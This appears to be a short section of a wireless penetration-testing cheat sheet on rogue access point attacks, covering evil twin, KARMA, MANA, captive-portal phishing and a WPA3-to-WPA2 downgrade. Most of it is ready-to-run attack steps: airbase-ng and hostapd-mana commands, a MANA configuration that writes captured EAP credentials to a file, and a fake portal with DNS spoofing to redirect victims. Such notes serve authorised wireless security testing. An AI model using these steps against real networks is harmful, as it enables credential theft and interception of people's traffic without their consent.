# 03 — Rogue AP Attacks

## Evil Twin (Classic)

Clone legitimate AP to trick clients into connecting.

```bash
airbase-ng -e "CorpWiFi" -c 6 -a 00:11:22:33:44:55 wlan0mon
```

## KARMA Attack

Respond to all directed probe requests with matching SSID.

```bash
# hostapd-mana with KARMA
hostapd-mana /etc/hostapd-mana/karma.conf
```

## MANA (MANA Loves Authenticated Networks)

Improved KARMA: captures EAP credentials and creates persistent associations.

```bash
# MANA configuration
interface=wlan0mon
ssid=MANA
channel=6
wpa=2
wpa_key_mgmt=WPA-EAP
mana_eap=1
mana_cred_out=/tmp/creds.txt
karma=1
```

## Captive Portal Rogue AP

Redirect all HTTP traffic to phishing page for credential capture.

```bash
# Create fake portal
python3 -m http.server 80
# dnsspoof to redirect *.com to attacker IP
```

## WPA3-Enterprise Downgrade

Force WPA2 connection to enable MSCHAPv2 relay.

```bash
# Broadcast WPA2 beacon with same SSID as WPA3-Enterprise
hostapd /etc/hostapd/wpa2-downgrade.conf
```
